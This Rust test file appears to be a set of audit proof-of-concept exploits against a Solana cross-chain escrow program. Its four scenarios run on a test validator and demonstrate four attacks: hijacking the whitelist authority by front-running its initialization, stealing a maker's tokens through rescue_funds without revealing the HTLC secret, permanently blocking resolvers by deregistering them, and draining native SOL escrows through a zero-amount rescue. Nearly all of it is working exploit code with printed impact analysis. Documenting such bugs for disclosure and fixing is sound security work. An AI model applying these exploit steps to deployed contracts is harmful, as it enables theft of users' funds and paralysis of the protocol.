use anchor_spl::token::spl_token::native_mint::ID as NATIVE_MINT;
use common::constants::RESCUE_DELAY;
use common_tests::dst_program::DstProgram;
use common_tests::helpers::*;
use common_tests::src_program::{create_order, SrcProgram};
use common_tests::whitelist::{deregister, init_whitelist, prepare_resolvers_src, register};
use solana_program_test::tokio;
use solana_sdk::{native_token::LAMPORTS_PER_SOL, signature::Signer, signer::keypair::Keypair};
use test_context::{test_context, AsyncTestContext};

// ============================================================================
// SCENARIO 1: Realistic End-to-End Cross-Chain Exit Scam (Theft of Principal)
// ============================================================================
#[test_context(TestStateBase<SrcProgram, TokenSPL>)]
#[tokio::test]
async fn test_attack_realistic_cross_chain_exit_scam(src_state: &mut TestStateBase<SrcProgram, TokenSPL>) {
    println!("\n=========================================");
    println!("=== SCENARIO 1: Realistic Cross-Chain Exit Scam ===");
    println!("=========================================");

    let mut dst_state = TestStateBase::<DstProgram, TokenSPL>::setup().await;

    // Sync secrets and hashlocks between the two chains
    src_state.secret = dst_state.secret;
    src_state.hashlock = dst_state.hashlock;

    // --- PHASE 1: NORMAL FLOW (Maker creates order BEFORE attack) ---
    println!("\n=== DAY 0: Normal Flow - Maker locks funds ===");
    
    src_state.test_arguments.asset_is_native = false;
    src_state.test_arguments.order_amount = 100_000_000; // 100 JUP
    src_state.test_arguments.escrow_amount = 100_000_000;
    
    // Read initial balances BEFORE create_order
    let maker_initial_jup = get_token_balance(&mut src_state.context, &src_state.maker_wallet.token_account).await;
    let attacker_initial_jup = get_token_balance(&mut src_state.context, &src_state.taker_wallet.token_account).await;
    let attacker_initial_sol = dst_state.client.get_balance(dst_state.maker_wallet.keypair.pubkey()).await.unwrap();
    
    // Maker creates order on Source Chain.
    let (_order_a, _order_ata_a) = create_order(src_state).await;
    
    // Sync order_hash to dst_state so the Attacker can use it on Chain B
    dst_state.order_hash = src_state.order_hash;

    println!("[CHAIN A] Maker locked 100 JUP in Order.");
    println!("[BEFORE] Maker JUP balance: {}", maker_initial_jup);
    println!("[BEFORE] Attacker (Taker) JUP balance: {}", attacker_initial_jup);
    println!("[BEFORE] Attacker (Maker DST) SOL balance: {}", attacker_initial_sol);

    // --- PHASE 2: THE INTERCEPTION (Attacker Front-runs Whitelist Initialize) ---
    println!("\n=== PHASE 2: Interception - Attacker front-runs Whitelist initialization ===");
    
    // The taker_wallet in src_state will act as our Attacker.
    src_state.authority_whitelist_kp = src_state.taker_wallet.keypair.insecure_clone();
    
    let _whitelist_state = init_whitelist(src_state).await; // Attacker wins the race!
    println!("[ATTACK] Attacker successfully hijacked Whitelist Authority.");

    // --- PHASE 3: ATTACKER BECOMES RESOLVER & FILLS ORDER ---
    println!("\n=== PHASE 3: Attacker registers as Resolver and fills Maker's order ===");
    
    // Attacker registers their wallet (taker_wallet) as a Resolver for SRC program
    register(src_state, cross_chain_escrow_src::ID, src_state.taker_wallet.keypair.pubkey()).await;
    println!("[ATTACK] Attacker registered as Resolver for SRC chain.");

    // Attacker (acting as Taker) fills the order on SRC. 100 JUP moves to escrow_ata.
    let (escrow_a, escrow_ata_a) = create_escrow(src_state).await;
    println!("[CHAIN A] Attacker filled order. 100 JUP moved to EscrowSrc.");

    // Attacker creates DST Escrow (Chain B) with 5 SOL
    dst_state.token = NATIVE_MINT;
    dst_state.test_arguments.asset_is_native = true;
    dst_state.test_arguments.escrow_amount = 5 * LAMPORTS_PER_SOL;
    dst_state.test_arguments.order_amount = 5 * LAMPORTS_PER_SOL;
    
    // In DST, the creator is the Attacker (maker_wallet in dst_state)
    let (escrow_b, escrow_ata_b) = create_escrow(&mut dst_state).await;
    println!("[CHAIN B] Attacker locked 5 SOL in EscrowDst.");
    println!("[CHAIN B] BUG: escrow_ata.amount = 0 due to missing sync_native!");

    // --- PHASE 4: THE EXPLOIT (Timelock Bypass & Fund Theft) ---
    println!("\n=== DAY 8: Attacker exploits rescue_funds ===");
    
    // Fast forward time by 8 days + 100 seconds
    set_time(&mut src_state.context, src_state.init_timestamp + RESCUE_DELAY + 100);
    set_time(&mut dst_state.context, dst_state.init_timestamp + RESCUE_DELAY + 100);

    // 4a: Attacker recovers SOL on DST via rescue_funds(0) due to missing sync_native
    println!("\n--- STEP 1: Attacker recovers SOL on Chain B ---");
    
    let attacker_sol_before_rescue = dst_state.client.get_balance(dst_state.maker_wallet.keypair.pubkey()).await.unwrap();
    
    dst_state.test_arguments.rescue_amount = 0;
    let rescue_tx_dst = DstProgram::get_rescue_funds_tx(
        &dst_state,
        &escrow_b,
        &dst_state.token,
        &escrow_ata_b,
        &dst_state.maker_wallet.native_token_account, // Attacker's native ATA
    );
    dst_state.client.process_transaction(rescue_tx_dst).await.expect_success();

    let attacker_sol_after_rescue = dst_state.client.get_balance(dst_state.maker_wallet.keypair.pubkey()).await.unwrap();
    let recovered_sol = attacker_sol_after_rescue - attacker_sol_before_rescue;
    
    println!("[CHAIN B] Attacker recovered {} lamports ({} SOL) via rescue_funds(0)!", 
             recovered_sol, recovered_sol as f64 / LAMPORTS_PER_SOL as f64);
    println!("[CHAIN B] EscrowB ATA is now closed. HTLC secret was NOT revealed.");

    // State Verification for Chain B
    println!("\n=== STATE VERIFICATION: Post-Exploit Account States (Chain B) ===");
    let escrow_b_account_after = dst_state.client.get_account(escrow_b).await.unwrap();
    let escrow_b_ata_after = dst_state.client.get_account(escrow_ata_b).await.unwrap();
    println!("[STATE] Escrow B data account still exists: {}", escrow_b_account_after.is_some());
    println!("[STATE] Escrow B ATA is closed/drained: {}", escrow_b_ata_after.is_none());
    if let Some(escrow_acc) = escrow_b_account_after {
        println!("[STATE] Escrow B data account lamports: {} (rent only)", escrow_acc.lamports);
    }
    assert!(escrow_b_ata_after.is_none(), "Escrow B ATA should be closed after exploit");

    // 4b: Attacker steals Maker's JUP on SRC via rescue_funds_for_escrow (NO SECRET NEEDED)
    println!("\n--- STEP 2: Attacker steals JUP on Chain A WITHOUT SECRET ---");
    
    let attacker_jup_before_rescue = get_token_balance(&mut src_state.context, &src_state.taker_wallet.token_account).await;
    
    // We use rescue_funds_for_escrow instead of withdraw!
    // The bug in SRC routes the funds to taker_ata (Attacker) and only checks RESCUE_DELAY.
    src_state.test_arguments.rescue_amount = 100_000_000; // Steal all 100 JUP
    let rescue_tx_src = SrcProgram::get_rescue_funds_tx(
        src_state,
        &escrow_a,
        &src_state.token,
        &escrow_ata_a,
        &src_state.taker_wallet.token_account, // Funds routed to attacker (taker)
    );
    src_state.client.process_transaction(rescue_tx_src).await.expect_success();

    let attacker_jup_after_rescue = get_token_balance(&mut src_state.context, &src_state.taker_wallet.token_account).await;
    let stolen_jup = attacker_jup_after_rescue - attacker_jup_before_rescue;
    
    println!("[CHAIN A] Attacker stole {} JUP via rescue_funds_for_escrow WITHOUT REVEALING THE SECRET!", stolen_jup);

    // --- PHASE 5: IMPACT ANALYSIS ---
    println!("\n=========================================");
    println!("=== CROSS-CHAIN PROFIT & LOSS ANALYSIS ===");
    println!("=========================================");
    
    let maker_final_jup = get_token_balance(&mut src_state.context, &src_state.maker_wallet.token_account).await;
    let attacker_final_jup = get_token_balance(&mut src_state.context, &src_state.taker_wallet.token_account).await;
    let attacker_final_sol = dst_state.client.get_balance(dst_state.maker_wallet.keypair.pubkey()).await.unwrap();
    
    let net_sol_change = attacker_final_sol as i64 - attacker_initial_sol as i64;
    let net_jup_change = attacker_final_jup as i64 - attacker_initial_jup as i64;
    
    println!("[DST Chain] Attacker initial SOL: {} ({} SOL)", 
             attacker_initial_sol, attacker_initial_sol as f64 / LAMPORTS_PER_SOL as f64);
    println!("[DST Chain] Attacker final SOL:   {} ({} SOL)", 
             attacker_final_sol, attacker_final_sol as f64 / LAMPORTS_PER_SOL as f64);
    println!("[DST Chain] Net SOL change:       {} lamports (Recovered)", net_sol_change);
    println!();
    println!("[SRC Chain] Attacker initial JUP: {}", attacker_initial_jup);
    println!("[SRC Chain] Attacker final JUP:   {}", attacker_final_jup);
    println!("[SRC Chain] Net JUP change:       {} JUP (STOLEN)", net_jup_change);
    println!();
    println!("[VERDICT] Attacker sacrificed ~{} SOL in fees/rent", 
             (-net_sol_change) as f64 / LAMPORTS_PER_SOL as f64);
    println!("[VERDICT] Attacker gained {} JUP on Source Chain", net_jup_change);
    println!("[VERDICT] This is a RISK-FREE THEFT: small fee loss >> massive token gain");

    println!("\n=========================================");
    println!("=== EXPLOIT SUMMARY & FINAL IMPACT ===");
    println!("=========================================");
    println!("[IMPACT] Maker LOST {} JUP on Chain A (stolen by Attacker).", stolen_jup);
    println!("[IMPACT] Maker CANNOT claim 5 SOL on Chain B (Escrow closed).");
    println!("[IMPACT] Attacker RECOVERED {} SOL on Chain B.", 
             recovered_sol as f64 / LAMPORTS_PER_SOL as f64);
    println!("[IMPACT] Attacker STOLE {} JUP on Chain A.", stolen_jup);
    println!("[IMPACT] HTLC atomicity is COMPLETELY BROKEN - secret never revealed!");
    println!("=========================================\n");

    // Final Assertions
    assert!(recovered_sol > 0, "Attacker should have recovered SOL from DST");
    assert!(stolen_jup > 0, "Attacker should have stolen JUP from SRC");
    assert!(net_jup_change > 0, "Attacker net JUP profit should be positive");
    assert!(maker_final_jup < maker_initial_jup, "Maker should have lost JUP");
}

// ============================================================================
// SCENARIO 2: Permanent DoS via Resolver Deregistration
// ============================================================================
#[test_context(TestStateBase<SrcProgram, TokenSPL>)]
#[tokio::test]
async fn test_attack_permanent_dos_via_deregister(src_state: &mut TestStateBase<SrcProgram, TokenSPL>) {
    println!("\n=========================================");
    println!("=== SCENARIO 2: Permanent DoS via Deregister ===");
    println!("=========================================");

    // --- PHASE 1: WHITELIST TAKEOVER ---
    println!("\n[PHASE 1] Attacker takes over Whitelist Protocol");
    let attacker_kp = Keypair::new();
    transfer_lamports(&mut src_state.context, WALLET_DEFAULT_LAMPORTS, &src_state.payer_kp, &attacker_kp.pubkey()).await;
    
    // Attacker front-runs the initialization
    src_state.authority_whitelist_kp = attacker_kp.insecure_clone();
    let _whitelist_state = init_whitelist(src_state).await;
    println!("[ATTACK] Attacker successfully front-ran initialization and is now Authority.");

    // --- PHASE 2: SETUP LEGIT RESOLVER ---
    println!("\n[PHASE 2] Setup Legit Resolver");
    let legit_resolver_kp = Keypair::new();
    transfer_lamports(&mut src_state.context, WALLET_DEFAULT_LAMPORTS, &src_state.payer_kp, &legit_resolver_kp.pubkey()).await;
    
    // Attacker (as authority) registers a legit resolver just to setup the environment
    register(src_state, cross_chain_escrow_src::ID, legit_resolver_kp.pubkey()).await;
    println!("[SETUP] Legit Resolver registered under Attacker's authority.");

    // --- PHASE 3: NORMAL FLOW BEFORE ATTACK ---
    println!("\n[PHASE 3] Normal Flow: Maker creates order, Legit Resolver fills it");
    src_state.test_arguments.asset_is_native = false;
    src_state.test_arguments.order_amount = 100_000_000;
    src_state.test_arguments.escrow_amount = 100_000_000;
    let (_order_1, _order_ata_1) = create_order(src_state).await;
    
    // Use legit resolver to fill the order
    src_state.taker_wallet.keypair = legit_resolver_kp.insecure_clone();
    let (escrow_1, _escrow_ata_1) = create_escrow(src_state).await;
    
    assert!(src_state.client.get_account(escrow_1).await.unwrap().is_some(), "Legit resolver should be able to fill");
    println!("[VERIFY] Legit Resolver successfully filled order before attack.");

    // --- PHASE 4: THE EXPLOIT (Deregister) ---
    println!("\n[PHASE 4] Attacker deregisters Legit Resolver");
    
    // Attacker uses their authority to deregister the legit resolver
    deregister(src_state, cross_chain_escrow_src::ID, legit_resolver_kp.pubkey()).await;
    println!("[ATTACK] Legit Resolver has been deregistered!");

    // --- PHASE 5: IMPACT ANALYSIS (DoS) ---
    println!("\n[PHASE 5] Legit Resolver attempts to fill another order");
    
    // Change salt to create a completely new order and avoid PDA collisions
    src_state.test_arguments.salt = DEFAULT_SALT + 1;
    let (_order_2, _order_ata_2) = create_order(src_state).await;
    
    // Legit resolver tries to fill it
    let (_, _, fill_tx) = create_escrow_data(src_state);
    let result = src_state.client.process_transaction(fill_tx).await;

    let is_dos = result.is_err();
    if is_dos {
        println!("[IMPACT] Legit Resolver transaction FAILED (DoS Successful).");
        println!("[IMPACT] Error: AccountNotInitialized (resolver_access PDA was closed by attacker).");
    } else {
        panic!("DoS failed, legit resolver should not be able to fill!");
    }

    println!("\n=========================================");
    println!("=== FINAL IMPACT ANALYSIS ===");
    println!("=========================================");
    println!("[VERDICT] Permanent DoS achieved. No legit resolvers can fill orders.");
    println!("[VERDICT] The 1inch cross-chain protocol on Solana is completely paralyzed.");
    
    assert!(is_dos, "Legit resolver should be blocked from filling orders");
}

// ============================================================================
// SCENARIO 3: Timelock Bypass Proof (Standalone)
// ============================================================================
#[test_context(TestStateBase<DstProgram, TokenSPL>)]
#[tokio::test]
async fn test_rescue_bypasses_cancellation_timelock(
    test_state: &mut TestStateBase<DstProgram, TokenSPL>
) {
    println!("\n=========================================");
    println!("=== SCENARIO 3: Timelock Bypass Proof ===");
    println!("=========================================");

    test_state.token = NATIVE_MINT;
    test_state.test_arguments.asset_is_native = true;
    test_state.test_arguments.escrow_amount = 5 * LAMPORTS_PER_SOL;
    test_state.test_arguments.order_amount = 5 * LAMPORTS_PER_SOL;
    
    // Set DstCancellation to 16 days (strictly greater than RESCUE_DELAY which is 8 days)
    let long_cancellation_delay = RESCUE_DELAY * 2; // 1382400 seconds = 16 days
    
    // The 8th argument (deployed_at) must be 0. The program will set it using Clock::get().
    test_state.test_arguments.dst_timelocks = init_timelocks(
        0, 0, 0, 0,
        DEFAULT_PERIOD_DURATION,
        DEFAULT_PERIOD_DURATION * 2,
        long_cancellation_delay,
        0, 
    );

    test_state.test_arguments.src_cancellation_timestamp = test_state.init_timestamp + long_cancellation_delay + 10000;
    
    prepare_resolvers_src(test_state, &[test_state.taker_wallet.keypair.pubkey()]).await;
    let (escrow, escrow_ata) = create_escrow(test_state).await;
    
    println!("[SETUP] Escrow created with DstCancellation = {} seconds ({} days)", 
             long_cancellation_delay, long_cancellation_delay / 86400);
    println!("[SETUP] RESCUE_DELAY = {} seconds ({} days)", 
             RESCUE_DELAY, RESCUE_DELAY / 86400);
    println!("[SETUP] RESCUE_DELAY < DstCancellation: {} < {} = {}", 
             RESCUE_DELAY, long_cancellation_delay, RESCUE_DELAY < long_cancellation_delay);

    // Time travel to Day 8 (after RESCUE_DELAY, but before DstCancellation)
    let exploit_time = test_state.init_timestamp + RESCUE_DELAY + 100;
    let cancellation_time = test_state.init_timestamp + long_cancellation_delay;
    
    set_time(&mut test_state.context, exploit_time);
    
    println!("\n[TIME] Current time = init + {} seconds (Day 8+)", RESCUE_DELAY + 100);
    println!("[TIME] DstCancellation time = init + {} seconds (Day 16)", long_cancellation_delay);
    println!("[TIME] We are BEFORE DstCancellation but AFTER RESCUE_DELAY: {}", exploit_time < cancellation_time);

    // PROOF 1: cancel() should FAIL
    println!("\n--- PROOF 1: Attempting normal cancel() ---");
    let cancel_tx = DstProgram::get_cancel_tx(test_state, &escrow, &escrow_ata);
    let cancel_result = test_state.client.process_transaction(cancel_tx).await;
    
    // RUST BORROW CHECKER: Save boolean state before Result is consumed/dropped
    let cancel_failed = cancel_result.is_err();
    if cancel_failed {
        println!("[PROOF 1] cancel() FAILED as expected.");
        println!("[PROOF 1] Normal cancellation is BLOCKED by timelock");
    } else {
        panic!("cancel() should have failed but succeeded!");
    }

    // PROOF 2: rescue_funds() should SUCCEED
    println!("\n--- PROOF 2: Attempting rescue_funds(amount=0) ---");
    test_state.test_arguments.rescue_amount = 0;
    let rescue_tx = DstProgram::get_rescue_funds_tx(
        test_state, 
        &escrow, 
        &test_state.token, 
        &escrow_ata,
        &test_state.maker_wallet.native_token_account,
    );
    let rescue_result = test_state.client.process_transaction(rescue_tx).await;
    
    // RUST BORROW CHECKER: Save boolean state
    let rescue_succeeded = rescue_result.is_ok();
    if rescue_succeeded {
        println!("[PROOF 2] rescue_funds() SUCCEEDED despite cancel() failing!");
        println!("[PROOF 2] rescue_funds BYPASSED the DstCancellation timelock");
    } else {
        panic!("rescue_funds() should have succeeded but failed: {:?}", rescue_result.unwrap_err());
    }

    println!("\n=========================================");
    println!("=== TIMELOCK BYPASS CONCLUSION ===");
    println!("=========================================");
    println!("[CONCLUSION] cancel() requires: now >= DstCancellation ({} days)", long_cancellation_delay / 86400);
    println!("[CONCLUSION] rescue_funds() requires: now >= deployed_at + RESCUE_DELAY ({} days)", RESCUE_DELAY / 86400);
    println!("[CONCLUSION] Since RESCUE_DELAY < DstCancellation, rescue_funds is a BACKDOOR");
    println!("[CONCLUSION] This allows Maker to bypass intended timelock protections!");
    println!("=========================================\n");

    assert!(cancel_failed, "cancel() should fail before DstCancellation");
    assert!(rescue_succeeded, "rescue_funds() should succeed after RESCUE_DELAY");
}

// ============================================================================
// SCENARIO 4: Single-Chain Zero-Amount Drain (Standalone)
// ============================================================================
#[test_context(TestStateBase<DstProgram, TokenSPL>)]
#[tokio::test]
async fn test_native_dst_zero_amount_drain(
    test_state: &mut TestStateBase<DstProgram, TokenSPL>
) {
    println!("\n=========================================");
    println!("=== SCENARIO 4: Single-Chain Zero-Amount Drain ===");
    println!("=========================================");

    test_state.token = NATIVE_MINT;
    test_state.test_arguments.asset_is_native = true;
    
    let steal_amount = 5 * LAMPORTS_PER_SOL;
    test_state.test_arguments.escrow_amount = steal_amount;
    test_state.test_arguments.order_amount = steal_amount;
    
    // Use prepare_resolvers_src
    prepare_resolvers_src(test_state, &[test_state.taker_wallet.keypair.pubkey()]).await;
    
    let maker_balance_before = test_state.client.get_balance(test_state.maker_wallet.keypair.pubkey()).await.unwrap();
    println!("[BEFORE] Maker SOL Balance: {} lamports ({} SOL)", 
             maker_balance_before, maker_balance_before as f64 / LAMPORTS_PER_SOL as f64);

    let (escrow, escrow_ata) = create_escrow(test_state).await;

    let maker_balance_after_create = test_state.client.get_balance(test_state.maker_wallet.keypair.pubkey()).await.unwrap();
    println!("[AFTER CREATE] Maker SOL Balance: {} lamports ({} SOL)", 
             maker_balance_after_create, maker_balance_after_create as f64 / LAMPORTS_PER_SOL as f64);

    let escrow_ata_lamports = test_state.client.get_balance(escrow_ata).await.unwrap();
    let escrow_ata_spl_amount = get_token_balance(&mut test_state.context, &escrow_ata).await;
    
    println!("[ESCROW STATE] Escrow ATA Lamports: {} ({} SOL)", 
             escrow_ata_lamports, escrow_ata_lamports as f64 / LAMPORTS_PER_SOL as f64);
    println!("[ESCROW STATE] Escrow ATA SPL Amount: {} (BUG: should be {} but is 0!)", 
             escrow_ata_spl_amount, steal_amount);

    set_time(
        &mut test_state.context,
        test_state.init_timestamp + RESCUE_DELAY + 100,
    );

    let maker_balance_before_exploit = test_state.client.get_balance(test_state.maker_wallet.keypair.pubkey()).await.unwrap();
    
    test_state.test_arguments.rescue_amount = 0;
    let rescue_tx = DstProgram::get_rescue_funds_tx(
        test_state,
        &escrow,
        &test_state.token,
        &escrow_ata,
        &test_state.maker_wallet.native_token_account,
    );
    test_state.client.process_transaction(rescue_tx).await.expect_success();

    let maker_balance_after_exploit = test_state.client.get_balance(test_state.maker_wallet.keypair.pubkey()).await.unwrap();
    let stolen_amount = maker_balance_after_exploit - maker_balance_before_exploit;
    
    println!("\n[AFTER EXPLOIT] Maker SOL Balance: {} lamports ({} SOL)", 
             maker_balance_after_exploit, maker_balance_after_exploit as f64 / LAMPORTS_PER_SOL as f64);
    println!("[STOLEN] Maker recovered: {} lamports ({} SOL)", 
             stolen_amount, stolen_amount as f64 / LAMPORTS_PER_SOL as f64);

    let escrow_ata_final = test_state.client.get_balance(escrow_ata).await.unwrap();
    println!("[FINAL STATE] Escrow ATA Lamports: {} (should be 0)", escrow_ata_final);

    println!("\n=========================================");
    println!("=== SINGLE-CHAIN EXPLOIT SUMMARY ===");
    println!("=========================================");
    println!("[MECHANISM] rescue_funds(amount=0) triggered close_account");
    println!("[MECHANISM] close_account drains ALL lamports (principal + rent)");
    println!("[ROOT CAUSE] Missing sync_native caused escrow_ata.amount = 0");
    println!("[ROOT CAUSE] Condition 0 == 0 is TRUE, triggering close");
    println!("=========================================\n");

    assert_eq!(escrow_ata_final, 0, "Escrow ATA should be completely drained");
    assert!(stolen_amount > 0, "Maker should have recovered lamports");
}
